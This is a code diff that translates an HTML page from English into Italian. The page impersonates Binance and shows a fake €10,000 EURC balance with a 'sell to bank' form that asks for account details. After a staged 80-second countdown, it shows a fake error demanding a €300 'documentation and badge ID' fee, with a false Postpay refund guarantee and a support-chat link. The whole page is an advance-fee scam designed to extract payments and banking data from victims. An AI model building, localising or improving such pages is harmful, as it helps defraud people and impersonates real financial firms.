@@ -1,8 +1,8 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="it">
 <head>
   <meta charset="UTF-8">
-  <title>Sell EURC to Bank</title>
+  <title>Vendi EURC </title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <style>
     body {
@@ -136,65 +136,65 @@
   </style>
 </head>
 <body>
-  <a href="https://widget-page.smartsupp.com/widget/f659c5b3d565aafa73ba3a49d4ce0baf57cea73b?ss-chat-settings" class="support-button">Contact Support</a>
+  <a href="https://widget-page.smartsupp.com/widget/f659c5b3d565aafa73ba3a49d4ce0baf57cea73b?ss-chat-settings" class="support-button">Contatta il supporto</a>
 
   <div class="app">
     <div class="eurc-logo">€</div>
     <div class="logo">BINANCE</div>
-    <div class="balance">€10,000 EURC</div>
-    <div class="slide-button" onclick="showSellPreview()">SELL TO BANK</div>
+    <div class="balance">€10.000 EURC</div>
+    <div class="slide-button" onclick="mostraAnteprima()">VENDI A BANCA</div>
 
-    <div class="section" id="sellPreview">
-      <div class="label">Select your bank</div>
+    <div class="section" id="anteprima">
+      <div class="label">Seleziona la tua banca</div>
       <div class="bank-options">
-        <div class="bank-button" onclick="selectBank('UniCredit')">UniCredit</div>
-        <div class="bank-button" onclick="selectBank('Postpay')">Postpay</div>
+        <div class="bank-button" onclick="selezionaBanca('UniCredit')">UniCredit</div>
+        <div class="bank-button" onclick="selezionaBanca('Postpay')">Postpay</div>
       </div>
-      <input type="text" placeholder="Account name">
-      <input type="text" placeholder="Account number">
-      <button class="button" onclick="startConfirmation()">CONFIRM ORDER</button>
+      <input type="text" placeholder="Nome account">
+      <input type="text" placeholder="Numero dell'account">
+      <button class="button" onclick="avviaConferma()">CONFERMA L'ORDINE</button>
     </div>
 
-    <div class="section" id="confirmation">
-      <p>Please wait while we process your order...</p>
-      <p id="timer">Time remaining: 80s</p>
+    <div class="section" id="conferma">
+      <p>Attendere mentre elaboriamo il tuo ordine...</p>
+      <p id="timer">Tempo rimanente: 80s</p>
     </div>
 
-    <div class="section" id="errorSection">
+    <div class="section" id="errore">
       <div class="error">
-        <div class="error-icon">⚠️ THE ORDER NEEDS €300 FOR FULL DOCUMENTATION AND BADGE ID AS LICENSE 🪪</div>
-        <p>The investment system will verify immediate release of €10,000 to your account details.</p>
-        <button class="button">PAY NOW</button>
+        <div class="error-icon">⚠️ L'ORDINE RICHIEDE €300 PER LA DOCUMENTAZIONE COMPLETA E BADGE ID COME LICENZA 🪪</div>
+        <p>Il sistema di investimento verificherà il rilascio immediato di €10.000 ai tuoi dati bancari.</p>
+        <button class="button">PAGA ORA</button>
       </div>
       <div class="disclaimer">
-        Your personal support will help you through the payment.<br>
-        POSTPAY guarantees 100% payment if €10,000 is not received after €300 deposit for full insurance documentation.
+        Il tuo supporto personale ti aiuterà a completare il pagamento.<br>
+        POSTPAY garantisce il 100% del pagamento se €10.000 non raggiunge il tuo conto dopo il deposito di €300 per la documentazione assicurativa completa.
       </div>
     </div>
   </div>
 
   <script>
-    function showSellPreview() {
-      document.getElementById('sellPreview').style.display = 'block';
+    function mostraAnteprima() {
+      document.getElementById('anteprima').style.display = 'block';
     }
 
-    function selectBank(bank) {
-      alert("Bank selected: " + bank);
+    function selezionaBanca(banca) {
+      alert("Banca selezionata: " + banca);
     }
 
-    function startConfirmation() {
-      document.getElementById('sellPreview').style.display = 'none';
-      document.getElementById('confirmation').style.display = 'block';
+    function avviaConferma() {
+      document.getElementById('anteprima').style.display = 'none';
+      document.getElementById('conferma').style.display = 'block';
 
-      let time = 80;
+      let tempo = 80;
       const timerEl = document.getElementById('timer');
-      const interval = setInterval(() => {
-        timerEl.textContent = `Time remaining: ${time}s`;
-        time--;
-        if (time < 0) {
-          clearInterval(interval);
-          document.getElementById('confirmation').style.display = 'none';
-          document.getElementById('errorSection').style.display = 'block';
+      const intervallo = setInterval(() => {
+        timerEl.textContent = `Tempo rimanente: ${tempo}s`;
+        tempo--;
+        if (tempo < 0) {
+          clearInterval(intervallo);
+          document.getElementById('conferma').style.display = 'none';
+          document.getElementById('errore').style.display = 'block';
         }
       }, 1000);
     }
